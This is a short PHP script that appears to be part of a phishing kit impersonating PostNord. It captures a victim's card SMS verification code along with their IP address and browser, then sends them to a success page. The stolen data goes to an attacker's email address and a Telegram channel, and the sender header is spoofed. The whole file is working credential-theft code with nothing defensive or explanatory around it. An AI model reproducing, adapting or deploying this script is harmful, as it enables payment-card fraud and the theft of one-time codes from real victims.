<?php
include "config.php";
$ip = getenv("REMOTE_ADDR");
$message = "------------------🤑  INFOS 🤑------------------\n

SMS : ".$_POST['visasms']."\n

------------------🤩 IP INFOS 🤩----------------\n
IP                        : $ip\n
BROWSER           : ".$_SERVER['HTTP_USER_AGENT']."\n
--------------------😎 BY BALHA  😎--------------\n";
$subject = "SMS: Card Infos : $ip ";
$send = "Elkayemhd@aol.com";  //7ot el mail ya jhon
$headers = 'From : postnord@login.tz'."r\n";
telegram($message);
mail($send,$subject,$message,$headers);
header("Location: ../success.html");
?>

